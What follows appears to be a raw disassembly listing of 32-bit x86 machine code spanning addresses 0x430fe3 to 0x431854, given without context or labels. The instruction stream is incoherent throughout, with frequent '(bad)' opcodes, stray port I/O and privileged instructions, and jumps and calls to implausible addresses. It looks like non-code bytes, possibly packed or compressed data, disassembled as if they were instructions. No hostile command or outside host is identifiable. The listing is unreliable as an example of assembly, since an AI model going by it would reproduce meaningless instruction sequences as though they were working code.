  430fe3:	mov    cl,cl
  430fe5:	inc    DWORD PTR [esp]
  430fe8:	push   ebp
  430fe9:	shr    esp,0x8
  430fec:	in     al,dx
  430fed:	push   esp
  430fee:	add    DWORD PTR [eax],esp
  430ff0:	add    bl,cl
  430ff2:	inc    ebp
  430ff3:	mov    bh,0x89
  430ff5:	add    ah,bh
  430ff7:	jmp    0xca771f41
  430ffc:	pushf  
  430ffd:	dec    esp
  430ffe:	push   ebx
  430fff:	and    BYTE PTR [ebp+0x17],al
  431002:	xor    eax,0x56009cd9
  431007:	add    BYTE PTR [ebp+0x2b],al
  43100a:	in     eax,0xc1
  43100c:	inc    ebp
  43100d:	add    eax,0xc601d8
  431012:	mov    al,0xc6
  431015:	ins    BYTE PTR es:[edi],dx
  431016:	mov    DWORD PTR [eax+0x6a],0xc805c6c1
  43101d:	dec    esp
  43101e:	xor    esp,DWORD PTR [eax]
  431020:	(bad)  
  431021:	fxch   st(1)
  431023:	sub    DWORD PTR [ebx],esi
  431025:	add    BYTE PTR [edx-0x40],bl
  431028:	mov    eax,0x248d8d00
  43102e:	xor    eax,0x188b0fc3
  431033:	push   ecx
  431034:	fimul  DWORD PTR [edx+0x8801d9]
  43103a:	or     DWORD PTR [ebx+0x36ed0806],0x45
  431041:	xor    ebx,ebp
  431043:	mov    al,BYTE PTR [ebp+0x1]
  431046:	jmp    0xdb4c554b
  43104b:	mov    dl,0x45
  43104d:	add    esi,ebp
  43104f:	add    BYTE PTR [ebp+0xe],al
  431052:	sub    DWORD PTR [edx+0x2e0145],eax
  431058:	inc    ebp
  431059:	or     BYTE PTR [ecx+ecx*2-0xa],bh
  43105d:	add    eax,DWORD PTR [edi+eax*8-0x24]
  431061:	cld    
  431062:	mov    dh,0xa5
  431064:	xor    edi,eax
  431066:	add    eax,DWORD PTR [ebp+0x46]
  431069:	prefetcht0 BYTE PTR [ecx-0x2]
  43106d:	xor    eax,0x7c60872
  431072:	mov    esp,0xbd32c69a
  431077:	pop    esi
  431078:	mov    cl,0xbe
  43107b:	or     al,0xc6
  43107d:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431084:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43108b:	add    dh,al
  43108d:	mov    eax,ebx
  43108f:	xor    DWORD PTR [ebx],0x35008dbc
  431095:	mov    ecx,DWORD PTR [edi]
  431097:	sbb    al,0x18
  431099:	inc    ebp
  43109a:	fcmovb st,st(7)
  43109c:	fxtract 
  43109e:	mov    BYTE PTR [ebp-0x38f7077d],al
  4310a4:	in     eax,dx
  4310a5:	call   0xf942962f
  4310aa:	inc    esi
  4310ac:	inc    ebp
  4310ad:	les    ecx,FWORD PTR [ebx-0x103a273a]
  4310b3:	push   edi
  4310b4:	adc    eax,DWORD PTR [ebp-0x77]
  4310b7:	out    0x8b,eax
  4310b9:	inc    ebp
  4310ba:	cmp    BYTE PTR [ecx],ch
  4310bc:	inc    DWORD PTR [ebp+0x3b]
  4310bf:	inc    ebp
  4310c0:	jne    0x4310f0
  4310c2:	(bad)  
  4310c3:	(bad)  
  4310c4:	mov    eax,0xf87c8545
  4310c9:	test   BYTE PTR [ebp-0x47],0xea
  4310cd:	add    BYTE PTR [eax+eax*1-0x3b03bb75],bl
  4310d4:	xor    BYTE PTR [esi+0x3003301],0x38
  4310db:	inc    esi
  4310dc:	test   DWORD PTR [eax],ebx
  4310de:	add    bh,dh
  4310e0:	add    BYTE PTR [edx+0x45],dh
  4310e3:	(bad)  
  4310e4:	mov    ebx,esp
  4310e6:	jl     0x4310ae
  4310e8:	add    ch,bl
  4310ea:	mov    esi,eax
  4310ec:	mov    ebx,esi
  4310ee:	cld    
  4310ef:	mov    BYTE PTR [eax+0xc601df],0xe0
  4310f6:	cmp    dh,al
  4310f8:	imul   esp,ecx,0xe28dc600
  4310fe:	shl    DWORD PTR [ebx],1
  431100:	mov    DWORD PTR [ebp+0xfff3564],ecx
  431106:	mov    ebx,DWORD PTR [eax]
  431108:	data16 fiadd DWORD PTR [ebp-0x770027]
  43110f:	add    eax,0x7
  431112:	in     ax,dx
  431114:	test   DWORD PTR [ebp-0x1],eax
  431117:	jmp    0xe48a571b
  43111c:	inc    bp
  43111e:	test   eax,esp
  431120:	inc    DWORD PTR [ebp-0x1]
  431123:	cmc    
  431124:	rol    BYTE PTR [ebp+0x66],0xdf
  431128:	test   DWORD PTR [ebp-0x1],eax
  43112b:	in     al,dx
  43112c:	inc    DWORD PTR [ebp+0x47]
  43112f:	out    0x66,eax
  431131:	inc    ebp
  431132:	test   DWORD PTR [edi+edi*8-0xa],edi
  431136:	inc    DWORD PTR [eax+eax*8-0x44]
  43113a:	data16 mov dh,0x85
  43113d:	xor    edi,edi
  43113f:	add    edi,edi
  431141:	inc    esi
  431142:	inc    edi
  431143:	sbb    BYTE PTR [esi-0x2],ah
  431146:	test   DWORD PTR [edx-0x1],esi
  431149:	(bad)  
  43114a:	(bad)  
  43114b:	cmp    bh,al
  43114d:	dec    DWORD PTR [ecx-0x278b77]
  431153:	dec    ebp
  431154:	cmp    DWORD PTR [eax+0x7189fc03],0x76
  43115b:	add    edi,edi
  43115d:	lea    edi,[eax+0xff99ff]
  431163:	enter  0xe89,0x78
  431167:	inc    ebp
  431168:	push   DWORD PTR ds:0xc7829cb8
  43116e:	add    BYTE PTR [eax-0x7857a77],bh
  431174:	inc    DWORD PTR [ebp-0x48]
  431177:	mov    edx,edi
  431179:	mov    WORD PTR [eax],es
  43117b:	add    BYTE PTR [ecx-0xf083c7],cl
  431181:	pop    edi
  431182:	add    DWORD PTR [eax],0xffffffe4
  431185:	mov    ecx,DWORD PTR [ecx-0x7f8104]
  43118b:	add    DWORD PTR [eax+0x382700],edi
  431191:	inc    ebp
  431192:	mov    DWORD PTR [ebx+0x4c8080],ecx
  431198:	add    BYTE PTR [ecx+0x4f45b866],cl
  43119e:	lea    eax,[eax]
  4311a0:	add    eax,0x89660878
  4311a5:	test   DWORD PTR [edi+edi*8-0x381600bb],eax
  4311ac:	loopne 0x431137
  4311ae:	(bad)  
  4311af:	data16 aam 0xff
  4311b2:	in     al,dx
  4311b3:	cmp    DWORD PTR [edi+edi*1+0x45],0xffffff89
  4311b8:	pop    ecx
  4311b9:	push   0x8ddaff18
  4311be:	jmp    0x4311bf
  4311c0:	mov    BYTE PTR [ecx-0x8a95c0],cl
  4311c6:	lea    eax,[ebx-0x767aee30]
  4311cc:	(bad)  
  4311cd:	ins    BYTE PTR es:[edi],dx
  4311ce:	(bad)  
  4311cf:	inc    DWORD PTR [ebp-0xfb0173]
  4311d5:	mov    DWORD PTR [ebx+0x53fff46e],ecx
  4311db:	adc    DWORD PTR [ecx+0x3d],0x33
  4311df:	mov    DWORD PTR [ebx+0xff7270],edi
  4311e5:	(bad)  
  4311e6:	ret    
  4311e7:	add    cl,BYTE PTR [ebx-0x3f8d0377]
  4311ed:	call   DWORD PTR [eax-0x75]
  4311f0:	inc    ebp
  4311f1:	mov    ax,WORD PTR [ebp-0xff0068]
  4311f8:	mov    eax,0x85ff66b0
  4311fe:	add    edi,edi
  431200:	add    bh,bh
  431202:	(bad)  
  431203:	stc    
  431204:	inc    DWORD PTR [eax]
  431206:	or     BYTE PTR [esi+0x45],ah
  431209:	test   DWORD PTR [ebp-0x7e008a01],eax
  43120f:	outs   dx,BYTE PTR ds:[esi]
  431210:	pop    DWORD PTR [eax]
  431212:	adc    ah,BYTE PTR [esi-0x78]
  431215:	test   DWORD PTR [eax-0x1],esi
  431218:	mov    ecx,0x6b4fff
  43121d:	add    cl,al
  43121f:	mov    WORD PTR [ebp-0x3f0078],ax
  431226:	mov    eax,eax
  431228:	data16 push bp
  43122b:	test   DWORD PTR [ebp-0x76000201],ecx
  431231:	dec    esp
  431232:	mov    WORD PTR [eax],es
  431234:	ret    0x6666
  431237:	inc    ebp
  431238:	push   ebp
  431239:	mov    eax,0xf3478d
  43123e:	mov    DWORD PTR [ecx+0x47c28290],ecx
  431244:	pushw  0x55
  431247:	lea    ax,[ebp-0x1f]
  43124b:	(bad)  
  43124c:	mov    eax,edx
  43124e:	xchg   esp,eax
  43124f:	in     al,0x89
  431251:	cmc    
  431252:	xchg   esi,eax
  431253:	inc    ebp
  431254:	iret   
  431255:	fisttp WORD PTR [ecx+0x4a8d98e7]
  43125b:	ror    BYTE PTR [ebx+0x5532668a],1
  431261:	or     BYTE PTR [ebx+0x55186639],0x49
  431268:	(bad)  
  431269:	repz cmp eax,0xa0898945
  43126f:	mov    ah,0x89
  431271:	jmp    DWORD PTR [edx+0x66b0418d]
  431277:	inc    DWORD PTR [ebp+0x50]
  43127a:	add    DWORD PTR [ebp-0xd],0xffffffbe
  43127e:	mov    DWORD PTR [eax],ecx
  431280:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431281:	pop    es
  431282:	inc    ecx
  431283:	(bad)  
  431284:	call   0x366:0x3245
  43128a:	dec    ebp
  43128b:	push   eax
  43128c:	inc    bp
  43128e:	jge    0x431213
  431290:	mov    esp,DWORD PTR [esi-0x18]
  431293:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  431299:	add    DWORD PTR [ebx],esi
  43129b:	add    BYTE PTR [ebx],al
  43129d:	test   DWORD PTR [ebx],esi
  43129f:	(bad)  
  4312a0:	inc    WORD PTR [ebp+0x0]
  4312a4:	mov    eax,DWORD PTR [eax]
  4312a6:	call   0x8898c9db
  4312ab:	mov    esi,eax
  4312ad:	clc    
  4312ae:	ret    
  4312af:	rol    cl,0xa
  4312b2:	mov    DWORD PTR ds:0x7c0ec88,esi
  4312b8:	mov    edx,edi
  4312ba:	pushf  
  4312bb:	pop    es
  4312bc:	jmp    DWORD PTR [edx+0x66]
  4312bf:	add    BYTE PTR [ebp-0x990175],al
  4312c5:	inc    ebp
  4312c6:	test   DWORD PTR [ebx-0x2f00ea02],eax
  4312cc:	push   ebp
  4312cd:	mov    edi,eax
  4312cf:	mov    dh,BYTE PTR [eax+0x266ff51]
  4312d5:	push   ebp
  4312d6:	add    BYTE PTR [ebx-0x764b0777],al
  4312dc:	dec    DWORD PTR [esi+0x661851e8]
  4312e2:	add    BYTE PTR [ebp-0x7b],dl
  4312e5:	cmp    esi,0xfffffff3
  4312e8:	dec    DWORD PTR [ecx+0x51fe9285]
  4312ee:	jmp    DWORD PTR [esi-0x75]
  4312f1:	push   ebp
  4312f2:	hlt    
  4312f3:	data16 (bad) 
  4312f5:	dec    ebp
  4312f6:	ret    
  4312f7:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4312fd:	lea    edx,[eax-0x1]
  431300:	jne    0x4312d3
  431302:	dec    DWORD PTR [ecx-0x2f7a63f8]
  431308:	dec    BYTE PTR [ecx+0x51559eff]
  43130e:	mov    DWORD PTR [esi-0x4c],esp
  431311:	push   ebp
  431312:	jmp    DWORD PTR [esi-0x18]
  431315:	inc    ebp
  431316:	sbb    BYTE PTR [ebp-0x767acd00],cl
  43131c:	(bad)  
  43131d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43131e:	inc    eax
  431320:	test   DWORD PTR [esi-0x2],esp
  431323:	inc    ebp
  431324:	dec    DWORD PTR [ebp-0x760bde75]
  43132a:	(bad)  
  43132b:	test   al,0xc3
  43132d:	mov    DWORD PTR [ebp-0x769b56],ecx
  431333:	lods   al,BYTE PTR ds:[esi]
  431334:	push   eax
  431335:	inc    ebp
  431336:	jne    0x431347
  431338:	dec    DWORD PTR [ebp+0x8]
  43133b:	mov    eax,DWORD PTR [ebx]
  43133d:	sbb    al,0x0
  43133f:	(bad)  
  431340:	mov    eax,0xc14fc3
  431345:	mov    DWORD PTR [eax-0x64],edi
  431348:	inc    bp
  43134a:	test   DWORD PTR [edi],ecx
  43134c:	dec    DWORD PTR [ebp-0x1]
  43134f:	xor    eax,edi
  431351:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  431357:	inc    ebp
  431358:	xor    DWORD PTR [ebx],0x3f
  43135b:	mov    WORD PTR [ebp-0x1bc],ax
  431362:	lea    ecx,[ecx-0x767702]
  431368:	inc    esi
  431369:	(bad)  
  43136a:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  431371:	pushf  
  431372:	rol    DWORD PTR [ebp-0x72019a],0xff
  431379:	add    bh,bh
  43137b:	add    BYTE PTR [edi],cl
  43137d:	test   DWORD PTR [eax],eax
  43137f:	(bad)  
  431380:	dec    WORD PTR [ebp-0xff0031]
  431387:	mov    DWORD PTR [ecx-0xb748],ecx
  43138d:	lea    eax,[ebx+0x7cffc1b0]
  431393:	push   eax
  431394:	add    BYTE PTR [ebp+0x66],al
  431397:	xor    ecx,DWORD PTR [ebp-0xaf00fd]
  43139d:	test   eax,esi
  43139f:	(bad)  
  4313a0:	fdiv   st(7),st
  4313a2:	add    bh,bh
  4313a4:	data16 clc 
  4313a6:	lea    edx,[ebp-0x1]
  4313a9:	(bad)  
  4313aa:	dec    DWORD PTR [eax-0x72b50077]
  4313b0:	dec    DWORD PTR [eax-0x1237a73]
  4313b6:	(bad)  
  4313b7:	(bad)  
  4313b8:	(bad)  
  4313b9:	cdq    
  4313ba:	inc    DWORD PTR [eax]
  4313bc:	ja     0x431347
  4313be:	lea    edi,[eax-0x72000050]
  4313c4:	push   ecx
  4313c5:	mov    al,0x4d
  4313c7:	jmp    DWORD PTR [esi+0x50]
  4313ca:	mov    ch,0x45
  4313cc:	push   DWORD PTR [ebx]
  4313ce:	inc    DWORD PTR [ebx]
  4313d0:	push   ebx
  4313d1:	push   eax
  4313d2:	push   ecx
  4313d3:	test   DWORD PTR [ebx],esi
  4313d5:	(bad)  
  4313d6:	mov    ebx,0xff72ff
  4313db:	clc    
  4313dc:	retf   
  4313dd:	push   ebp
  4313de:	(bad)  
  4313df:	jmp    0x1421524
  4313e4:	push   ecx
  4313e5:	jae    0x4313a7
  4313e7:	add    BYTE PTR [ebp-0x38bb73],cl
  4313ed:	mov    DWORD PTR [ecx+0x40],edx
  4313f0:	(bad)  
  4313f1:	(bad)  
  4313f2:	cld    
  4313f3:	mov    eax,DWORD PTR [ebp-0x7a019a]
  4313f9:	inc    DWORD PTR [ebp-0x3f0101]
  4313ff:	inc    bp
  431401:	test   DWORD PTR [ebx+0xff98ff],ecx
  431407:	inc    edi
  431408:	(bad)  
  431409:	dec    si
  43140b:	test   edi,edi
  43140d:	(bad)  
  43140e:	cmp    eax,0xc74f7bff
  431413:	mov    edx,DWORD PTR [edx-0x7d]
  431416:	(bad)  
  431417:	mov    ebx,0x563a8931
  43141c:	(bad)  
  43141d:	call   FWORD PTR [esi-0x47]
  431420:	inc    DWORD PTR ds:0x893c00e2
  431426:	mov    DWORD PTR [eax-0x4c],ebx
  431429:	(bad)  
  43142a:	jmp    DWORD PTR [esi-0x1]
  43142d:	test   edi,edi
  43142f:	dec    DWORD PTR [eax]
  431431:	(bad)  
  431432:	inc    eax
  431434:	or     BYTE PTR [ecx+0x8b5745],bh
  43143a:	sbb    al,0x89
  43143c:	rcr    BYTE PTR [edx-0x7c],0xff
  431440:	add    ecx,DWORD PTR [ebx+0x6165b900]
  431446:	add    BYTE PTR [eax],al
  431448:	inc    ebp
  431449:	mov    DWORD PTR ds:0xc7ff9c5c,esi
  43144f:	data16 fdiv DWORD PTR [ebp-0x7007b]
  431456:	inc    ebp
  431457:	dec    ebp
  431458:	cmp    DWORD PTR [ecx-0x38b764],ecx
  43145e:	lock lea eax,[ebp+0x458df81c]
  431465:	(bad)  
  431466:	xor    eax,0x8b8b9fff
  43146b:	hlt    
  43146c:	cld    
  43146d:	mov    DWORD PTR [eax+0xff014c],eax
  431473:	mov    esi,0x78b0845
  431478:	cld    
  431479:	into   
  43147a:	dec    ebp
  43147b:	call   0x5100:0x38c328b
  431482:	mov    ecx,DWORD PTR [ebp-0x6f0075]
  431488:	add    BYTE PTR [ebx],dh
  43148a:	mov    DWORD PTR [eax-0x1c],eax
  43148d:	lea    edi,[ebp-0x2]
  431490:	test   edi,edi
  431492:	jne    0x4314e4
  431494:	push   DWORD PTR [ebp+0x18]
  431497:	mov    DWORD PTR [ebp+0x44],edx
  43149a:	call   0xffcd0f9e
  43149f:	mov    al,0x45
  4314a1:	dec    DWORD PTR [ebx+0x3fc8b8b]
  4314a7:	cmp    BYTE PTR [ecx+eax*1],0xf
  4314ab:	add    BYTE PTR [ebp-0x7b],al
  4314ae:	test   edi,edi
  4314b0:	je     0x4314b1
  4314b2:	dec    DWORD PTR [edi-0x4]
  4314b5:	dec    edi
  4314b6:	or     al,BYTE PTR [ebp-0x740001]
  4314bc:	cld    
  4314bd:	dec    edi
  4314be:	or     BYTE PTR [edi+0x1],0x85
  4314c2:	add    bh,bh
  4314c4:	add    bh,bh
  4314c6:	(bad)  
  4314c7:	icebp  
  4314c8:	ret    
  4314c9:	dec    edi
  4314ca:	inc    ebp
  4314cb:	xchg   ebp,eax
  4314cc:	jne    0x4314cc
  4314ce:	mov    edi,edi
  4314d0:	cld    
  4314d1:	xor    BYTE PTR [ecx+0x500155],cl
  4314d7:	push   ebp
  4314d8:	xor    DWORD PTR [ecx+0x45011c80],ecx
  4314de:	add    BYTE PTR [ebp+0x35e90f50],al
  4314e4:	add    al,BYTE PTR [eax]
  4314e6:	add    BYTE PTR [ebx-0x38fe4f80],al
  4314ec:	add    ah,ch
  4314ee:	or     BYTE PTR [ebp+0x4501f845],dh
  4314f4:	jmp    0xdf17ee
  4314f9:	(bad)  
  4314fa:	nop    ecx
  4314fd:	test   DWORD PTR [ebp+0x4502f8],eax
  431503:	cmp    ecx,DWORD PTR [ebp-0x64]
  431506:	mov    eax,edi
  431508:	mov    ebx,DWORD PTR [eax+edx*2]
  43150b:	add    eax,0x45fef885
  431510:	dec    DWORD PTR [ebx+0x339445]
  431516:	add    ecx,DWORD PTR [ecx+0x4500f889]
  43151c:	dec    DWORD PTR [ebx-0x460f0375]
  431522:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431523:	add    esi,edi
  431525:	add    bh,bh
  431527:	rdpmc  
  431529:	add    BYTE PTR [ebx],0x1
  43152c:	mov    DWORD PTR [eax],eax
  43152e:	add    al,0x45
  431530:	dec    DWORD PTR [ecx-0x360b3373]
  431536:	dec    DWORD PTR [esi]
  431538:	push   eax
  431539:	jne    0x431580
  43153b:	mov    esi,DWORD PTR [ebx]
  43153d:	cld    
  43153e:	add    ebp,ebp
  431540:	push   eax
  431541:	inc    DWORD PTR [ebp-0x75]
  431544:	add    eax,0x800e4
  431549:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43154f:	mov    DWORD PTR [ecx],eax
  431551:	sbb    al,0x0
  431553:	leave  
  431554:	test   DWORD PTR [edi-0x2],eax
  431557:	jne    0x431558
  431559:	call   0xff44005e
  43155e:	xor    BYTE PTR [ebp+0x4d],al
  431561:	mov    edi,edi
  431563:	enter  0x8,0x4d
  431567:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  43156d:	mov    eax,DWORD PTR [eax]
  43156f:	cld    
  431570:	add    DWORD PTR [ecx],ebx
  431572:	inc    ebp
  431573:	dec    ebp
  431574:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  43157a:	inc    eax
  43157b:	dec    DWORD PTR [ecx-0x270375]
  431581:	add    BYTE PTR [ebx-0x39d72701],cl
  431587:	xchg   ecx,eax
  431588:	ret    
  431589:	add    BYTE PTR [ebp-0x830075],al
  43158f:	add    BYTE PTR [ebp-0x75],al
  431592:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431598:	lea    edi,[edi-0xc]
  43159b:	add    bh,bh
  43159d:	mov    edx,DWORD PTR [eax-0x7b]
  4315a0:	inc    ebp
  4315a1:	rdpmc  
  4315a3:	jne    0x4315a8
  4315a5:	add    BYTE PTR [eax-0x75],dl
  4315a8:	inc    ebp
  4315a9:	clc    
  4315aa:	add    eax,0x400009
  4315af:	mov    DWORD PTR [ebx-0x7f000304],ecx
  4315b5:	mov    eax,DWORD PTR [ecx]
  4315b7:	in     al,dx
  4315b8:	add    dh,al
  4315ba:	test   ebx,eax
  4315bc:	inc    BYTE PTR [ebp-0xff0001]
  4315c2:	add    BYTE PTR [ebp-0x43],al
  4315c5:	cmp    esi,0xfffffff8
  4315c8:	(bad)  
  4315c9:	push   DWORD PTR [eax]
  4315cb:	add    BYTE PTR [ebp-0x3a],dl
  4315ce:	test   ebx,eax
  4315d0:	je     0x431557
  4315d2:	mov    edi,edi
  4315d4:	sbb    al,0xff
  4315d6:	test   DWORD PTR gs:[eax],eax
  4315d9:	(bad)  
  4315da:	js     0x4315db
  4315dc:	add    BYTE PTR [ebx-0x39b20bdd],cl
  4315e2:	sub    eax,ebx
  4315e4:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4315ea:	add    eax,DWORD PTR [eax]
  4315ec:	dec    ebp
  4315ed:	push   eax
  4315ee:	mov    al,BYTE PTR [ebp+0x1]
  4315f1:	mov    eax,DWORD PTR [ebp-0x68]
  4315f4:	mov    eax,DWORD PTR [eax]
  4315f6:	sbb    bh,al
  4315f8:	or     ah,dh
  4315fa:	dec    ebp
  4315fb:	inc    DWORD PTR [eax+0x4]
  4315fe:	push   ecx
  4315ff:	add    BYTE PTR [edx-0x1],dh
  431602:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  431608:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  431612:	add    ecx,DWORD PTR [ecx-0x1be77477]
  431618:	push   ecx
  431619:	cmp    BYTE PTR [ebx],al
  43161b:	inc    ebp
  43161c:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  431622:	(bad)  
  431623:	(bad)  
  431624:	in     al,0xff
  431626:	add    BYTE PTR [ebp+0x0],al
  431629:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  43162f:	add    al,bh
  431631:	(bad)  
  431632:	jmp    0x8d85:0x74b0558d
  431639:	dec    DWORD PTR [eax]
  43163b:	call   DWORD PTR [ebp-0x7b]
  43163e:	mov    edi,esi
  431640:	lock call DWORD PTR [ebp-0x75]
  431644:	mov    esi,esp
  431646:	mov    ah,0xc6
  431648:	mov    bh,0xc3
  43164a:	mov    DWORD PTR [ebx-0x110003c4],ecx
  431650:	add    DWORD PTR [eax],0x450050ff
  431656:	mov    DWORD PTR [ebx+0x9598cc],ecx
  43165c:	inc    edi
  43165e:	push   esp
  431660:	jmp    0xcd00:0x660481ff
  431667:	mov    DWORD PTR [ebx],esi
  431669:	clc    
  43166a:	cmp    edi,0xff9cff3a
  431670:	jne    0x43167a
  431672:	mov    eax,eax
  431674:	add    esi,DWORD PTR [eax]
  431676:	int3   
  431677:	inc    ebp
  431678:	cmp    al,0x83
  43167a:	add    BYTE PTR [eax],bl
  43167c:	adc    DWORD PTR [ebx+0x768b5055],eax
  431682:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431688:	mov    edi,eax
  43168a:	cmp    BYTE PTR [ebp+0x45],cl
  43168d:	jmp    0x43161a
  43168f:	mov    ebx,DWORD PTR [esp+ebp*8]
  431692:	inc    ebp
  431693:	or     al,0x2
  431695:	dec    DWORD PTR [ebp+0x18]
  431698:	jne    0x4316ef
  43169a:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  4316a0:	mov    edi,DWORD PTR [ebx]
  4316a2:	in     al,0x50
  4316a4:	xchg   ecx,eax
  4316a5:	jmp    0x34365aa
  4316aa:	adc    al,0x8b
  4316ac:	inc    ebp
  4316ad:	mov    al,ds:0x8b04008b
  4316b2:	push   ebp
  4316b3:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  4316b9:	push   ebp
  4316ba:	test   DWORD PTR [ebx-0x2800d701],ecx
  4316c0:	inc    ebp
  4316c1:	dec    ebp
  4316c2:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  4316c8:	mov    DWORD PTR [eax],0xe9ff00f4
  4316ce:	add    al,0x0
  4316d0:	add    BYTE PTR [eax],al
  4316d2:	mov    eax,edx
  4316d4:	push   eax
  4316d5:	rol    DWORD PTR [ebp-0xf0177],1
  4316db:	bound  eax,QWORD PTR [ebp+0x50]
  4316de:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4316e4:	add    BYTE PTR [ecx+0x558df0ff],cl
  4316ea:	mov    al,0xf
  4316ec:	test   DWORD PTR [edx],edx
  4316ee:	call   DWORD PTR [ebp-0x7a0001]
  4316f4:	(bad)  
  4316f5:	loop   0x4316f6
  4316f7:	jnp    0xc6990afd
  4316fd:	mov    eax,ebx
  4316ff:	cmp    al,0x8b
  431701:	(bad)  
  431702:	cld    
  431703:	shr    esi,0xc
  431706:	add    dl,al
  431708:	push   eax
  431709:	lea    eax,[ebp-0x1]
  43170c:	mov    edx,esi
  43170e:	cwde   
  43170f:	cli    
  431710:	add    BYTE PTR [ebp+0x1ffff8ff],al
  431716:	or     BYTE PTR [eax],cl
  431718:	inc    ebp
  431719:	dec    ebp
  43171a:	inc    DWORD PTR [ebx+0x74803914]
  431720:	add    DWORD PTR [ebx+0x451800],ecx
  431726:	call   DWORD PTR [eax+edx*1]
  431729:	add    ecx,DWORD PTR [ebp-0x34]
  43172c:	push   edi
  43172d:	adc    al,0x8
  43172f:	mov    edx,DWORD PTR [ebp-0x14]
  431732:	mov    ecx,DWORD PTR [ebp+0x18]
  431735:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  431739:	inc    DWORD PTR [eax+esi*8]
  43173c:	inc    ebp
  43173d:	stos   BYTE PTR es:[edi],al
  43173e:	mov    edx,DWORD PTR [ebp-0x4]
  431741:	add    DWORD PTR [ebp-0x1c],eax
  431744:	mov    edx,DWORD PTR [ebp-0x70]
  431747:	cmp    eax,DWORD PTR [eax]
  431749:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43174a:	mov    eax,DWORD PTR [eax]
  43174c:	cld    
  43174d:	jae    0x4316cf
  43174f:	add    eax,DWORD PTR [ecx]
  431751:	clc    
  431752:	add    BYTE PTR [eax+0x30],dl
  431755:	mov    DWORD PTR [ecx],esi
  431757:	clc    
  431758:	pop    ds
  431759:	inc    ebp
  43175a:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  431760:	(bad)  
  431761:	push   DWORD PTR [edi]
  431763:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431769:	(bad)  
  43176a:	jae    0x43176b
  43176c:	mov    eax,DWORD PTR [ebp-0x740175]
  431772:	sub    eax,DWORD PTR [eax]
  431774:	add    eax,DWORD PTR [eax]
  431776:	mov    DWORD PTR [ecx+0x5f],eax
  431779:	mov    DWORD PTR [ebx-0x4],ebx
  43177c:	ret    0xff
  43177f:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431785:	ret    
  431786:	mov    eax,DWORD PTR [ebp-0x6f0075]
  43178c:	add    BYTE PTR [ebp-0x7d],al
  43178f:	mov    DWORD PTR [eax],eax
  431791:	add    al,0x84
  431793:	inc    DWORD PTR [ecx]
  431795:	lea    eax,[eax]
  431797:	hlt    
  431798:	sar    bh,cl
  43179a:	test   BYTE PTR [eax+0x1],dl
  43179d:	inc    ebp
  43179e:	add    BYTE PTR [ebx],dh
  4317a0:	test   BYTE PTR [ebx],0x84
  4317a3:	push   eax
  4317a4:	add    BYTE PTR [ebp+0x0],al
  4317a7:	add    eax,0x86
  4317ac:	add    BYTE PTR [ebx-0x7f7b0340],cl
  4317b2:	add    BYTE PTR [ecx],al
  4317b4:	add    BYTE PTR [eax],al
  4317b6:	mov    esi,0x550030
  4317bb:	mov    ecx,DWORD PTR [edi]
  4317bd:	cld    
  4317be:	fidiv  DWORD PTR [ebp+0x0]
  4317c1:	mov    edi,DWORD PTR [ecx]
  4317c3:	xor    BYTE PTR [eax+eax*1],0x84
  4317c7:	add    eax,DWORD PTR [eax]
  4317c9:	sbb    BYTE PTR [eax],al
  4317cb:	jne    0x43177e
  4317cd:	mov    eax,DWORD PTR [ecx]
  4317cf:	sbb    BYTE PTR [eax],al
  4317d1:	mov    DWORD PTR [ebp-0x1],esp
  4317d4:	add    BYTE PTR [eax+0x30e45ca],bh
  4317da:	ret    0xb7fc
  4317dd:	dec    ebp
  4317de:	or     al,0x89
  4317e0:	dec    ebp
  4317e1:	cld    
  4317e2:	cmovne ecx,DWORD PTR [eax-0x75]
  4317e6:	add    edi,esp
  4317e8:	seto   BYTE PTR [esi-0x72ffffff]
  4317ef:	inc    ebp
  4317f0:	adc    al,0x8b
  4317f2:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4317f9:	cmp    DWORD PTR [edi+0x72],edx
  4317fc:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  431802:	gs cmp al,0x0
  431805:	je     0x4317dd
  431807:	push   eax
  431808:	sar    BYTE PTR [eax],1
  43180a:	mov    bh,0x3e
  43180c:	push   cs
  43180d:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  431813:	add    DWORD PTR [ecx+0x12],ebp
  431816:	dec    edx
  431817:	(bad)  
  431818:	mov    eax,edx
  43181a:	in     al,dx
  43181b:	adc    DWORD PTR [ecx],esi
  43181d:	pop    esi
  43181e:	inc    ecx
  43181f:	leave  
  431820:	or     DWORD PTR [eax],ebx
  431822:	gs push ebp
  431824:	add    ah,ch
  431826:	into   
  431827:	in     al,dx
  431828:	enter  0xb756,0xf0
  43182c:	push   cs
  43182d:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  431837:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  43183d:	jnp    0x74439d45
  431843:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431849:	add    BYTE PTR [edi],cl
  43184b:	mov    edi,DWORD PTR [ecx-0x78]
  43184e:	ltr    WORD PTR [ecx-0x7b]
  431852:	dec    DWORD PTR [edi]
  431854:	clc    
